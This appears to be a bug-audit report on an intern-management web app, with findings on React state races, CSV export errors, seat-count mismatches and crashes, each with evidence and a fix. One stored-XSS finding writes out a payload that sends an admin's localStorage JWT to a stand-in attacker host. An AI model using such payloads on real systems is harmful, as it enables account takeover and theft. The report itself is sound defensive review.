**What's wrong:** `getInactiveInternDailyRecords` applies `.sort({ date: -1 }).limit(200)` and returns no total or truncation flag. The frontend then displays `dailyRecords.length` as an authoritative entry count (AdminInactiveInterns.jsx:1116) and builds the whole calendar from the truncated `recordsByDate`, so anything beyond the 200 newest entries is invisible with no indication that data was dropped. Because the sort is descending, it is the *oldest* — i.e. the start of the internship — that disappears.

**Failure:** A 12-month intern submitted 245 logbook entries. The admin opens Past Interns -> that intern -> Daily Records. The badge reads '200 entries' (wrong — there are 245) and the first ~45 working days of the internship are simply not highlighted on the calendar, so the admin reviewing early-internship performance sees blank, un-clickable dates and concludes the intern submitted nothing for their first two months.

**Evidence:**
```
backend/controllers/inactiveInternController.js:271-273:
```
      const dailyRecords = await DailyRecord.find(query)
        .sort({ date: -1 })
        .limit(200); // higher limit since we index by date
```
Frontend treats the result as complete — frontend/src/pages/AdminInactiveInterns.jsx:1116 `{dailyRecords.length} {dailyRecords.length !== 1 ? "entries" : "entry"}`.
```

**Fix:** Return `total: await DailyRecord.countDocuments(query)` alongside `data`, render that value in the badge, and either remove the limit (records are small) or show a 'showing newest 200 of N' note.

## [LOW] Logbook status badge has no mapping for "study_leave", rendering a grey badge with the raw enum text
`frontend/src/pages/AdminInactiveInterns.jsx:280` · *logic*

**What's wrong:** workStatusBadge maps only working / leave / wfh, but DailyRecord.status is an enum of ["working", "leave", "wfh", "study_leave"] (backend/models/DailyRecord.js:41-45). The missing case falls through to the grey default, and the badge text itself is the untransformed `selectedRecord.status`, so the raw snake_case enum is shown to the admin.

**Failure:** An admin clicks a logbook date where the intern recorded study leave. The badge in the entry header renders grey (the same colour used for unknown/invalid values) with the literal text "study_leave" instead of an orange/indigo "Study Leave" badge, making study leave visually indistinguishable from a corrupted status value.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:280-287:
  const workStatusBadge = (status) => {
    const map = {
      working: "bg-blue-100 text-blue-700",
      leave: "bg-orange-100 text-orange-700",
      wfh: "bg-indigo-100 text-indigo-700",
    };
    return map[status?.toLowerCase()] ?? "bg-gray-100 text-gray-500";
  };
Rendered raw at line 391-394. Enum: backend/models/DailyRecord.js:41-45.
```

**Fix:** Add `study_leave: "bg-purple-100 text-purple-700"` to the map and render a humanised label (`status.replace(/_/g,' ')` with capitalisation) rather than the raw enum.

## [LOW] Selecting another intern while a reactivate is in flight wipes the newly-opened profile
`frontend/src/pages/AdminInactiveInterns.jsx:705` · *race-condition*

**What's wrong:** handleReactivate's success path unconditionally calls setSelectedIntern(null) and setDetails(null). The Reactivate button is disabled during the mutation, but the intern cards in the strip are not — handleSelectIntern is still wired to onClick at line 821 with no `reactivating` guard. So the completion handler for intern A clears whatever selection exists at that moment, including a different intern the admin has since opened.

**Failure:** Admin clicks Reactivate on intern A and confirms, then (while the spinner runs) clicks intern B's card to keep working. B's details load and render. A's request then completes: setSelectedIntern(null) and setDetails(null) fire, B's whole details panel disappears and is replaced by the "No Intern Selected" empty state, while the green banner reads "A has been reactivated!". The admin has to find and re-click B.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:697-708 — inside `if (res.ok)`:
        setSelectedIntern(null);
        setDetails(null);
Cards remain clickable during the mutation: line 821 `onClick={() => handleSelectIntern(intern)}` has no `reactivating` guard (only the button at line 925 is disabled).
```

**Fix:** Only clear the selection if it still refers to the reactivated intern: `setSelectedIntern((cur) => (cur?.id === targetId ? null : cur));` capturing targetId before the await, and likewise for details.

## [LOW] toISOString() on an unvalidated DailyRecord.date string throws RangeError and 500s the whole daily-records endpoint
`backend/controllers/inactiveInternController.js:278` · *crash*

**What's wrong:** The recordsByDate loop calls `new Date(r.date).toISOString()` on DailyRecord.date, which is `{ type: String, required: true }` with no format validator, no match regex and no enum (backend/models/DailyRecord.js:13-16). If any record's date string is not parseable, `new Date()` yields Invalid Date and `.toISOString()` throws a RangeError, which the outer catch converts into a 500 for the entire request — one bad row poisons every record for that intern.

**Failure:** A single legacy or imported DailyRecord for an intern has date "2025-13-45" or "25/06/2026". An admin opens that intern's Daily Records tab; the endpoint throws "RangeError: Invalid time value", returns 500, and the frontend sets recordsError and renders "Failed to load daily records." — the intern's other 119 perfectly valid logbook entries become permanently unviewable through this page with no indication of which record is at fault.

**Evidence:**
```
backend/controllers/inactiveInternController.js:276-280:
      const recordsByDate = {};
      for (const r of dailyRecords) {
        const key = new Date(r.date).toISOString().slice(0, 10);
        recordsByDate[key] = r;
      }
Schema with no format constraint: backend/models/DailyRecord.js:13-16. Frontend failure surface: frontend/src/pages/AdminInactiveInterns.jsx:670 `setRecordsError("Failed to load daily records.");`
```

**Fix:** Use the tolerant helper the codebase already has — `getColomboDateKey(r.date)` from backend/utils/attendanceHistory.js, which returns date-only strings verbatim and falls back to String(value) on unparseable input — instead of raw toISOString().

# AdminInternLocations — 9 findings

## [HIGH] Find-Intern-by-ID silently does nothing when a district filter is active
`frontend/src/pages/AdminInternLocations.jsx:430` · *react-state*

**What's wrong:** handleIdSearch sets highlightedIntern + flyTo and then calls `setSelectedDistrict("All")` in the same batch. The effect at lines 364-374 is keyed on `selectedDistrict` and its first two statements are `setHighlightedIntern(null); setFlyTo(null);`. Because the district actually changed (e.g. "Kandy" -> "All"), that effect fires immediately after the search commit and wipes the result the search just produced. The 1500ms `markerMapRef.current[intern.id].openPopup()` at 431-434 then runs against a marker layer that was torn down and rebuilt by the refetch.

**Failure:** Admin selects district "Kandy", types trainee ID 3425 and presses Enter. The backend returns the intern successfully, but no orange highlight appears, the map does not fly anywhere, the amber "Showing location for …" banner never renders and no popup opens — the page just resets to All Districts. Doing the same search while the filter is already on "All" works, which makes it look intermittent.

**Evidence:**
```
AdminInternLocations.jsx:427-434 sets highlightedIntern/flyTo then 430 `setSelectedDistrict("All")`; AdminInternLocations.jsx:364-369 `useEffect(..., [selectedDistrict, ...])` -> `setHighlightedIntern(null); setFlyTo(null); setListSearch("");`.
```

**Fix:** Guard the reset effect so it only clears the highlight on a user-initiated district change (e.g. do the clearing inside the `<select onChange>` handler instead of in the effect), or set the district first and apply highlight/flyTo after the refetch resolves.

## [HIGH] Stored XSS: marker popup HTML is built by string interpolation of unescaped intern data
`frontend/src/pages/AdminInternLocations.jsx:148` · *security*

**What's wrong:** popupContent is a template string that interpolates `intern.name`, `intern.id`, `intern.district`, `intern.institute` and `intern.address` directly into HTML, then `marker.bindPopup(popupContent)` injects it into the DOM. None of these values are escaped. They originate from the Intern collection, which can be written by `POST /api/interns/add-external` (backend/routes/internRoutes.js:116) — a route with no authentication middleware.

**Failure:** Anyone POSTs to /api/interns/add-external with `Trainee_Name: '<img src=x onerror="fetch(ATTACKER+localStorage.adminInfo)">'` and a real Sri Lankan address (so geocodeAddress succeeds and `location.coordinates` is populated). The next admin who opens /admin/intern-locations and clicks or spiderfies that marker executes the payload in the admin origin, exfiltrating the adminInfo JWT from localStorage.

**Evidence:**
```
AdminInternLocations.jsx:145-162 — `<p ...>${intern.name}</p>` … `${intern.address || "<em>No address</em>"}` … `marker.bindPopup(popupContent, { maxWidth: 260 })`; backend/controllers/internController.js:105-132 persists req.body wholesale; backend/routes/internRoutes.js:116 `router.post("/add-external", addExternalIntern)` has no auth guard.
```

**Fix:** Escape every interpolated value (`const esc = (s) => String(s ?? "").replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))`) before building popupContent, or build the popup with DOM nodes / `textContent` instead of an HTML string.

## [MEDIUM] Hourly auto-refresh reloads the wrong district (stale closure over selectedDistrict)
`frontend/src/pages/AdminInternLocations.jsx:353` · *react-state*

**What's wrong:** The mount effect has an empty dependency array (with the exhaustive-deps rule disabled at line 360) but its setInterval callback reads `selectedDistrict`. That variable is captured from the first render, where it is always "All", and is never updated because the interval is created once.

**Failure:** Admin filters to "Colombo" and leaves the page open. Sixty minutes later the interval fires `fetchInternLocations(token, "All")`. The map and the "Active Interns in Colombo" table repopulate with every intern in the country while the dropdown still reads "Colombo" and the header still says "Active in Colombo" with a country-wide count.

**Evidence:**
```
AdminInternLocations.jsx:340-361 — `useEffect(() => { ... const iv = setInterval(() => { fetchInternLocations(adminInfo.token, selectedDistrict); ... }, 60*60*1000); return () => clearInterval(iv); }, [])`.
```

**Fix:** Hold the current district in a ref updated on each change and read `districtRef.current` inside the interval, or add `selectedDistrict` to the dependency array so the interval is recreated.

## [MEDIUM] Past-intern layer keeps stale district data when toggled off and on again
`frontend/src/pages/AdminInternLocations.jsx:380` · *logic-error*

**What's wrong:** handleTogglePastInterns only fetches when `!pastFetched`, and the district-change effect only refetches past interns when `showPastInterns && pastFetched` (line 371). Once past interns have been fetched even a single time, turning the layer off, changing the district, and turning it back on shows data for the previous district — the `pastFetched` flag records "have I ever fetched" instead of "is my data current for this district".

**Failure:** Admin toggles Past Interns on while on All Districts (say 250 violet markers), toggles it off, selects "Kandy", toggles it back on. The active layer correctly shows only Kandy, but 250 violet past-intern markers from every district reappear and the "Past Interns" stat card shows 250 instead of the Kandy count.

**Evidence:**
```
AdminInternLocations.jsx:377-386 `if (next && !pastFetched) { ... fetchPastInternLocations(...) }`; AdminInternLocations.jsx:371-373 `if (showPastInterns && pastFetched) { fetchPastInternLocations(adminInfo.token, selectedDistrict); }`.
```

**Fix:** Track the district the past data was fetched for (`pastFetchedDistrict`) and refetch whenever it differs from selectedDistrict, or always refetch on toggle-on.

## [MEDIUM] District filter has no request cancellation — an older response can overwrite a newer one
`frontend/src/pages/AdminInternLocations.jsx:246` · *race-condition*

**What's wrong:** fetchInternLocations/fetchPastInternLocations issue plain axios GETs with no AbortController and no sequence guard, and the district-change effect (364-374) has no cleanup. Two rapid district selections produce two in-flight requests whose completion order is not guaranteed; whichever resolves last wins, and `setLoading(false)` in the first `finally` hides the spinner while the second request is still running.

**Failure:** Admin picks "Colombo" (large, slow response) then immediately picks "Jaffna". Jaffna's small response arrives first and renders; Colombo's arrives afterwards and replaces it. The dropdown reads "Jaffna", the header reads "Active Interns in Jaffna", and the table lists Colombo interns.

**Evidence:**
```
AdminInternLocations.jsx:252-265 `const res = await axios.get(...); setInterns(valid);` with no cancellation; effect at 364-374 returns no cleanup function.
```

**Fix:** Create an AbortController per fetch, pass `signal` to axios, and abort it in the effect cleanup; or compare a captured `requestedDistrict` against the current state before calling setInterns.

## [MEDIUM] Popup for a searched / list-clicked intern often never opens (fixed 1500ms timer races the marker rebuild; markerMapRef is never pruned)
`frontend/src/pages/AdminInternLocations.jsx:431` · *race-condition*

**What's wrong:** Both handleIdSearch and handleListRowClick schedule `markerMapRef.current[intern.id].openPopup()` on a hard-coded 1500ms timeout. SpiderfyLayer tears down its layer and rebuilds every marker whenever `interns` changes, and onReady merges the new markers into markerMapRef without ever clearing removed ones (line 773). If the refetch takes longer than 1.5s the ref still points at a detached marker; Leaflet's `_prepareOpen` bails out because `_source._map` is null, so openPopup silently no-ops. The timers are also never cleared on unmount.

**Failure:** On a slow connection the admin searches a trainee ID from a filtered district (or clicks "View on Map" right after switching districts). The map flies to the location but no popup ever appears, and clicking the marker manually is the only way to see the intern's details. Detached markers from every previous district also accumulate in markerMapRef for the life of the page.

**Evidence:**
```
AdminInternLocations.jsx:431-434 and 463-466 `setTimeout(() => { const m = markerMapRef.current[intern.id]; if (m) m.openPopup(); }, 1500)`; AdminInternLocations.jsx:772-774 `markerMapRef.current = { ...markerMapRef.current, ...markerMap }` (never reset); SpiderfyLayer cleanup at 189-198 removes the layer but not the ref entries.
```

**Fix:** Replace the merge with an assignment (`markerMapRef.current = markerMap`) per layer, and open the popup from SpiderfyLayer's onReady/effect once the marker for `highlightedId` actually exists instead of from a fixed timer; store timeout ids and clear them on unmount.

## [LOW] Unguarded JSON.parse of localStorage adminInfo can blank the whole page
`frontend/src/pages/AdminInternLocations.jsx:341` · *crash*

**What's wrong:** Four call sites parse `localStorage.getItem("adminInfo")` with no try/catch. The `|| "{}"` fallback only covers a missing key, not a corrupted value (e.g. the literal string `undefined`, or a truncated write). Lines 341 and 365 run inside useEffect bodies and line 409 runs before handleIdSearch's try block, so a throw propagates as an uncaught render/effect error and unmounts the tree. AdminSeatManagement's equivalent parses (154, 237, 269) all sit inside try blocks and degrade gracefully.

**Failure:** An admin whose adminInfo entry was left in a bad state by an interrupted login opens /admin/intern-locations and gets a blank white screen with `SyntaxError: Unexpected token u in JSON` in the console, instead of being redirected to /admin-login.

**Evidence:**
```
AdminInternLocations.jsx:341 (mount effect), :365 (district effect), :381 (toggle handler), :409 (handleIdSearch, before the try at 413) — all `JSON.parse(localStorage.getItem("adminInfo") || "{}")`.
```

**Fix:** Use the shared helper in frontend/src/utils/adminAuth.js (or a local `safeParse` that try/catches and returns {}) and redirect to /admin-login when no token is recovered.

## [LOW] District-count fetch failures are swallowed by empty catch blocks
`frontend/src/pages/AdminInternLocations.jsx:286` · *error-handling*

**What's wrong:** fetchDistrictCounts and fetchPastDistrictCounts both end in `} catch {}`. On failure (expired token, 403 from the interns.view permission check, network error) districtCounts stays `[]` and countForDistrict returns 0 for every district, which the option renderer treats as "no interns here" and hides the count entirely — the same output as a genuinely empty database.

**Failure:** An admin whose role lacks `interns.view` (or whose token just expired) opens the page. The dropdown lists all 25 districts with no counts beside any of them, looking like a database with zero geocoded interns, and nothing in the UI indicates that the request was rejected.

**Evidence:**
```
AdminInternLocations.jsx:279-289 `} catch {}` at 286; AdminInternLocations.jsx:292-303 `} catch {}` at 300; rendering at 586-589 `${d}${countForDistrict(d) > 0 ? ` (${countForDistrict(d)})` : ""}`.
```

**Fix:** Capture the error into a state flag and surface it (or reuse the existing `error` banner), and distinguish 401/403 by redirecting to /admin-login.

## [LOW] Page issues two identical intern-location requests on every mount
`frontend/src/pages/AdminInternLocations.jsx:364` · *react-state*

**What's wrong:** The mount effect (340-361) calls fetchInternLocations(token, "All") and the district effect (364-374) also runs on mount with selectedDistrict === "All", firing the same request a second time. Both callbacks are stable (`useCallback([API_BASE])`), so this is purely the initial double-run — and the two responses race each other through the same setLoading/setInterns pair.

**Failure:** Every time an admin opens /admin/intern-locations the network tab shows two GET /admin/intern-locations calls; on a large dataset the loading overlay flickers off after the first response while the second is still in flight.

**Evidence:**
```
AdminInternLocations.jsx:346 `fetchInternLocations(adminInfo.token, "All");` and AdminInternLocations.jsx:370 `fetchInternLocations(adminInfo.token, selectedDistrict);` in an effect keyed on `[selectedDistrict, fetchInternLocations, fetchPastInternLocations]`.
```

**Fix:** Drop the duplicate call from the mount effect (keep only the counts + interval there) and let the district effect own the intern-location fetch.

# AdminSeatManagement — 10 findings

## [CRITICAL] Pending Check-ins export always lists every booked intern (queries a field that does not exist on DailyRecord)
`backend/controllers/adminSeatController.js:525` · *api-contract-mismatch*

**What's wrong:** getPendingCheckIns filters DailyRecord on `attendance: "present"`, but DailyRecordSchema (backend/models/DailyRecord.js:3-50) has no `attendance` path — its fields are internId, traineeId, date, stack, task, progress, blockers, status. Mongoose 8 defaults `strictQuery` to false, so the non-schema condition is sent to MongoDB verbatim and matches zero documents. `attendedRecords` is therefore always [], `attendedInternIdSet` is always empty, and the `!attendedInternIdSet.has(...)` filter at line 539 keeps 100% of the day's bookings. (The only writer of that field, backend/services/attendanceWorkflowService.js:184, is itself a `$set` on a non-schema path, which Mongoose strips under the default strict:true update mode, so no document ever carries it.)

**Failure:** Admin opens /admin/seat-management for today, 40 interns booked seats and 38 of them scanned face/QR attendance. Admin clicks "Pending Check-ins" (AdminSeatManagement.jsx:345). The CSV downloads with all 40 rows instead of 2, and the success toast says "Exported 40 pending check-ins". Admin then chases 38 interns who actually did check in.

**Evidence:**
```
adminSeatController.js:522-528 `DailyRecord.find({ internId: {$in: bookedInternIds}, date: targetDateStr, attendance: "present" })` vs models/DailyRecord.js:3-50 which defines no `attendance` field. Real daily attendance lives on `Intern.attendance[]` (controllers/dailyRecordController.js:33,44) and in FaceAttendanceLog (`status: "present"`, `attendanceDate`).
```

**Fix:** Query the collection that actually records check-ins, e.g. `FaceAttendanceLog.find({ internId: { $in: bookedInternIds }, attendanceDate: targetDateStr, status: "present" })`, or match `Intern.attendance` entries for the date. If DailyRecord submission is meant to count as the check-in, drop the `attendance` condition and match on `date` alone (and add the field to the schema if it is genuinely intended).

## [HIGH] Exported bookings CSV is column-shifted on every row: unquoted toLocaleString value contains a comma
`frontend/src/api/adminSeatApi.js:330` · *file-export*

**What's wrong:** convertToCSV builds each row by `.join(",")` and inserts `bookedAt.toLocaleString("en-US")` without quoting. The en-US locale format is `M/D/YYYY, h:mm:ss AM` — it always contains a comma, so every data row gets one extra field. Header has 7 columns, every data row has 8. `internName` is wrapped in quotes but inner double quotes are not doubled (line 327), unlike the pending-check-ins exporter which does escape them (line 399). traineeId/email/status are never quoted at all.

**Failure:** Admin clicks "Export Bookings" on any day with bookings and opens seat_bookings_2026-08-05.csv in Excel. Every row is shifted: the "Booked At" cell splits into `8/5/2026` and ` 10:30:00 AM`, so `Status` lands in an 8th unnamed column and the Status column shows the time fragment. An intern named `John "JD" Silva` breaks the Name column as well.

**Evidence:**
```
adminSeatApi.js:320-333 — `bookedAt.toLocaleString("en-US")` placed in an array that is `.join(",")`ed at line 332; headers array at 307-315 has 7 entries.
```

**Fix:** Route every cell through an escape helper: `const esc = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`;` and use it for all seven fields, or emit ISO/`sv-SE` timestamps that contain no comma.

## [MEDIUM] Stale response race: a slow fetch for the previous date overwrites the newly selected date's bookings
`frontend/src/pages/AdminSeatManagement.jsx:151` · *race-condition*

**What's wrong:** Neither fetchBookings nor silentRefresh uses an AbortController or a request-sequence guard. The 15s poll effect clears its interval on date change, but a silentRefresh already in flight (which closed over the OLD selectedDate) still resolves and unconditionally calls `setBookings(data.bookings)` / `setStats(data.stats)`. The same applies to two overlapping fetchBookings calls when the date input is changed twice quickly.

**Failure:** Admin changes the date from Aug 5 to Aug 6 within the ~1s window after a poll fired. The Aug 6 response lands first, then the Aug 5 poll response overwrites it. The header reads "Seat Bookings - Aug 6, 2026" and the floor plan marks Aug 5's seats as booked, with no error shown. It only self-corrects at the next 15s tick.

**Evidence:**
```
AdminSeatManagement.jsx:157-159 `const data = await adminSeatApi.getSeatBookings(selectedDate || null); setBookings(data.bookings || []); setStats(data.stats);` with no staleness check; AdminSeatManagement.jsx:244-247 same in fetchBookings; effect cleanup at 176 only clears the interval.
```

**Fix:** Capture a request token (`const reqDate = selectedDate;` or an incrementing ref) before the await and discard the response if it no longer matches the current selectedDate; or pass an AbortController signal through adminSeatApi and abort in the effect cleanup.

## [MEDIUM] "Available" tile subtracts seats twice when a seat is both booked and locked
`frontend/src/pages/AdminSeatManagement.jsx:454` · *logic-error*

**What's wrong:** The tile computes `TOTAL_SEATS - (stats.occupiedSeats + lockedSeatsCount)`. `stats.occupiedSeats` is the distinct seat count of active bookings for the selected date and `lockedSeatsCount` is the total LockedSeat documents; the two sets overlap because lockSeat explicitly permits locking a seat that already has an active booking (adminSeatController.js:394-415 returns a `warning` for exactly this case).

**Failure:** Seat 12 is booked for today and the admin locks it (accepting the "has an active booking that will remain" warning). Occupied stays 1 and Locked becomes 1, so Available shows 86 instead of 87. With N such overlaps the count is N too low, and once bookings+locks exceed 88 the tile renders a negative number.

**Evidence:**
```
AdminSeatManagement.jsx:454 `{loading ? "-" : TOTAL_SEATS - (stats.occupiedSeats + lockedSeatsCount)}`; adminSeatController.js:394-414 locks a seat that has an active booking and only returns a warning.
```

**Fix:** Compute the union client-side from the data already in state: `TOTAL_SEATS - new Set([...bookings.map(b => b.seatNumber), ...lockedSeats]).size`, and clamp at 0.

## [MEDIUM] AdminSeat is redefined inside render, remounting all 88 seats on every state change
`frontend/src/pages/AdminSeatManagement.jsx:584` · *react-state*

**What's wrong:** `const AdminSeat = ({...}) => {...}` is declared inside an IIFE in JSX, so a brand-new component type is created on every render. React compares element types by identity, sees a different type each time, and unmounts + remounts all 88 seat nodes instead of updating them. Every 15s poll, every search keystroke, every ResizeObserver scale update, and every lock/unlock triggers a full teardown of the floor plan.

**Failure:** Admin hovers a seat to read its tooltip while typing in the search box (or when the 15s poll lands): the framer-motion `whileHover` scale snaps back, the native `title` tooltip disappears, and the whole grid visibly flickers. On lower-end machines the map stutters every 15 seconds.

**Evidence:**
```
AdminSeatManagement.jsx:583-657 — `{(() => { const AdminSeat = ({ number, x, y, angle, radius, centerX, centerY }) => { ... }; return (<> {leftSection.topRow.map((s) => <AdminSeat .../>)} ... </>); })()}`.
```

**Fix:** Hoist AdminSeat to module scope (or a `useCallback`-free top-level component) and pass lockedSeats/bookingsBySeat/lockedSeatDetailsBySeat/onSelect as props; wrap it in React.memo.

## [MEDIUM] Booking-history search builds an unescaped RegExp — special characters return a 500
`backend/controllers/adminSeatController.js:228` · *error-handling*

**What's wrong:** getInternBookingHistory passes the raw query string straight into `$regex` for Trainee_ID, Trainee_Name and traineeId. MongoDB compiles it as a PCRE, so any invalid-regex input throws a driver error that falls into the catch and returns 500. Valid-but-pathological patterns are also accepted and evaluated against every Intern and SeatBooking document.

**Failure:** Admin types `C++` (or a lone `(`, `*`, `[`) into the Search Intern box and clicks View History. The backend throws `Regular expression is invalid`, returns 500, and the page shows the red inline message "Failed to fetch booking history" — indistinguishable from a server outage.

**Evidence:**
```
adminSeatController.js:226-238 `Intern.findOne({ $or: [{ Trainee_ID: { $regex: searchTerm, $options: "i" } }, { Trainee_Name: { $regex: searchTerm, $options: "i" } }] })` and `bookingQuery = { $or: [{ traineeId: { $regex: searchTerm, $options: "i" } }] }`; frontend AdminSeatManagement.jsx:277-279 sends the raw box contents.
```

**Fix:** Escape before use: `const safe = searchTerm.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");` then `{ $regex: safe, $options: "i" }` (and cap the length).

## [MEDIUM] Booking history mixes several interns because the traineeId regex is unanchored
`backend/controllers/adminSeatController.js:237` · *logic-error*

**What's wrong:** The booking query matches `traineeId` with an unanchored case-insensitive substring regex, while `internInfo` is taken from the single `Intern.findOne` result. So the rows returned can belong to many different trainees while the header names only one of them.

**Failure:** Admin searches trainee ID "34". The response contains bookings for trainees 34, 340, 1234 and 3425, but the panel header reads "Booking History - <name of whichever intern findOne matched first>" and the footer reads "Showing 47 bookings for <that one intern>". Exporting that view produces a CSV that looks like one intern's history but is not.

**Evidence:**
```
adminSeatController.js:236-238 `let bookingQuery = { $or: [{ traineeId: { $regex: searchTerm, $options: "i" } }] };` with no `^…$` anchors; internInfo assembled from a single intern at 286-299; rendered at AdminSeatManagement.jsx:720-722 and 866.
```

**Fix:** Anchor the trainee-ID branch (`{ traineeId: new RegExp('^' + escaped + '$', 'i') }`) or, when an Intern is resolved, query bookings by that intern's exact Trainee_ID / internId only.

## [MEDIUM] Seat-count constants disagree: 88 in the UI, 96 in the admin controller, 95 in the availability endpoint
`frontend/src/pages/AdminSeatManagement.jsx:32` · *data-integrity*

**What's wrong:** The floor plan defines exactly 88 seats (useSeatManagement.jsx ALL_SEATS, numbers 1-88 with no gaps or duplicates), and AdminSeatManagement hardcodes TOTAL_SEATS = 88. The backend reports `availableSeats: 96 - occupiedSeats` (adminSeatController.js:61 and :119), the public availability endpoint uses `totalSeats = 95` (seatBookingController.js:308), and both LockedSeat and SeatReserve validate seatNumber up to 96. A seat locked at 89-96 (reachable via a direct POST to /api/admin/seat-bookings/lock, which the route only guards with dashboard-level permission) is counted in `lockedSeatsCount` but has no tile on the grid, so it can never be unlocked from the UI.

**Failure:** Someone locks seat 90 via the API. The admin page's Locked tile shows 1 and Available drops to 87, but no locked tile exists anywhere on the floor plan — the admin cannot find or unlock it. Separately, any UI that renders the backend's `availableSeats` reports 8 (or 7) more free seats than physically exist.

**Evidence:**
```
AdminSeatManagement.jsx:32 `const TOTAL_SEATS = 88;`; adminSeatController.js:61 `availableSeats: 96 - occupiedSeats`; adminSeatController.js:377 `seatNumber > 96`; seatBookingController.js:308 `const totalSeats = 95;`; useSeatManagement.jsx:169-182 ALL_SEATS.length === 88.
```

**Fix:** Export a single TOTAL_SEATS constant (88) from a shared config, import it on the frontend, and use it for validation and availability math on the backend; reject lock/booking requests for seatNumber > 88.

## [LOW] A failed history search leaves the page stuck in history mode with the map and date picker hidden
`frontend/src/pages/AdminSeatManagement.jsx:265` · *error-handling*

**What's wrong:** handleSearchBookingHistory sets `showHistory = true` before awaiting the request and never reverts it in the catch branch (which only sets searchMessage and clears searchResults). Everything gated on `!showHistory` — the date picker, the three stat tiles, the seat layout card and the Pending Check-ins button — stays hidden, while `displayBookings` silently falls back to `filteredBookings` because `searchResults?.bookings` is null.

**Failure:** Admin searches a name and the request fails (500 from the regex bug above, or a network blip). A red "Failed to fetch booking history" message appears, the seat map and date selector vanish, and the table shows today's bookings filtered by the search text under a "Seat Bookings - Aug 5, 2026" heading. The only way back is to clear the search box.

**Evidence:**
```
AdminSeatManagement.jsx:264-266 `setSearchLoading(true); setShowHistory(true);` vs the catch at 294-301 which never calls `setShowHistory(false)`; gating at 434, 443, 543 and 727.
```

**Fix:** Set `showHistory` to true only after a successful response, and add `setShowHistory(false)` in the catch block.

## [LOW] Bookings table flashes the "No bookings found" empty state on every load (derived state kept in useState)
`frontend/src/pages/AdminSeatManagement.jsx:191` · *react-state*

**What's wrong:** filteredBookings is a derived value stored in state and synced by an effect that runs after commit. When fetchBookings resolves, setBookings and setLoading(false) are batched into one render in which filteredBookings is still the previous value ([] on first load), and the empty-state branch is gated on `!loading && displayBookings.length === 0`.

**Failure:** On first page load, and again on each date change, the table renders "No bookings found / There are no active seat bookings at the moment" for one frame before the rows appear — a visible flash that reads as a failed load.

**Evidence:**
```
AdminSeatManagement.jsx:191-212 the sync effect; AdminSeatManagement.jsx:246-251 `setBookings(...)` then `setLoading(false)` in finally; AdminSeatManagement.jsx:769 `{!loading && displayBookings.length === 0 ? (...)}`.
```

**Fix:** Compute filteredBookings during render with useMemo over [bookings, searchQuery] and delete the state + effect.

# SeatReservation (useSeatManagement) — 4 findings

## [MEDIUM] Unlocking a seat leaves it permanently marked as taken until a full reload
`frontend/src/pages/useSeatManagement.jsx:281` · *logic-error*

**What's wrong:** fetchLockedSeats tries to rebuild takenSeatsByAnyone as `bookedOnly = prev.filter(s => !fetched.includes(s))` where `fetched` is the NEW locked list. A seat that was in the previous locked set but is absent from the new one is not in `fetched`, so it survives the filter and is re-added to the merged result. There is no record of the previous locked set, so releases are never subtracted.

**Failure:** Admin unlocks seat 30 in AdminSeatManagement. On the intern's already-open Seat Reservation page the 15s poll runs: lockedSeats correctly drops 30, but takenSeatsByAnyone keeps it. getSeatStatus(30) now returns "booked" (line 597), the seat renders red, and clicking it alerts "This seat is already booked for …". The Available counter is one too low and Booked one too high. Only a page reload or a date change fixes it.

**Evidence:**
```
useSeatManagement.jsx:279-283 `setLockedSeats(fetched); setTakenSeatsByAnyone((prev) => { const bookedOnly = prev.filter((s) => !fetched.includes(s)); return [...new Set([...bookedOnly, ...fetched])]; });`
```

**Fix:** Subtract the OLD locked set instead: inside `setLockedSeats((oldLocked) => {...})` compute `booked = prev.filter(s => !oldLocked.includes(s))`, or keep booked seats in their own state slice and derive `takenSeatsByAnyone = [...new Set([...bookedSeats, ...lockedSeats])]`.

## [MEDIUM] Polling refreshes only locked seats, never bookings — seats booked by others still look free
`frontend/src/pages/useSeatManagement.jsx:657` · *react-state*

**What's wrong:** The 15s polling effect calls only `fetchLockedSeats()`. `takenSeatsByAnyone` is refreshed from real booking data solely inside `loadBookingsForDate`, which runs on mount, on date change, and after the user's own book/cancel. Bookings made by other interns while the page sits open are therefore never picked up.

**Failure:** Two interns open the seat map for tomorrow at 09:00. Intern A books seat 20. Intern B's map still shows seat 20 green for the rest of the session; B clicks it, the optimistic update paints it booked, the POST returns 400 "Seat 20 is already booked for this date", B gets an alert and the UI rolls back. B repeats on the next seat someone else just took.

**Evidence:**
```
useSeatManagement.jsx:655-662 `const pollInterval = setInterval(() => { fetchLockedSeats(); }, 15000);` — no call to loadBookingsForDate; takenSeatsByAnyone is only rebuilt at lines 331-334 inside loadBookingsForDate.
```

**Fix:** Poll `loadBookingsForDate(selectedDate)` alongside fetchLockedSeats (guarding against overlapping in-flight requests), and add `selectedDate` to the polling effect's dependency array.

## [LOW] setState called from inside another setState updater in loadBookingsForDate
`frontend/src/pages/useSeatManagement.jsx:331` · *react-state*

**What's wrong:** To read lockedSeats without adding it to the dependency array, loadBookingsForDate calls `setTakenSeatsByAnyone(...)` inside the `setLockedSeats` updater and returns the value unchanged. Updater functions must be pure — React may invoke them more than once (it does exactly that in StrictMode dev), and because the returned value is identical React can bail out of that update entirely, making the nested call's execution an implementation detail rather than a guarantee.

**Failure:** In StrictMode development the updater runs twice, so setTakenSeatsByAnyone is scheduled twice per load; any future React change that memoizes or skips bail-out updaters would stop takenSeatsByAnyone from being refreshed at all, leaving the seat map showing every seat as available after a date change.

**Evidence:**
```
useSeatManagement.jsx:331-334 `setLockedSeats((currentLocked) => { setTakenSeatsByAnyone([...new Set([...bookedSeats, ...currentLocked])]); return currentLocked; });`
```

**Fix:** Keep booked seats in their own state (`setBookedSeats(bookedSeats)`) and derive `takenSeatsByAnyone` with useMemo from bookedSeats + lockedSeats, removing the nested updater entirely.

## [LOW] Cancelling during the optimistic-booking window sends `undefined` as the booking id
`frontend/src/pages/useSeatManagement.jsx:537` · *crash*

**What's wrong:** handleDateBookingConfirm writes a placeholder `{ dummy: true }` into dailyBookings before the POST resolves. handleCancelBooking reads `dailyBookings[seatNumber]` and passes `booking.id` — undefined for the placeholder — to cancelBooking, producing `PUT /seat-reservation/bookings/cancel/undefined`. The backend runs `SeatBooking.findById("undefined")`, which throws a CastError caught by the generic handler and returned as a 500.

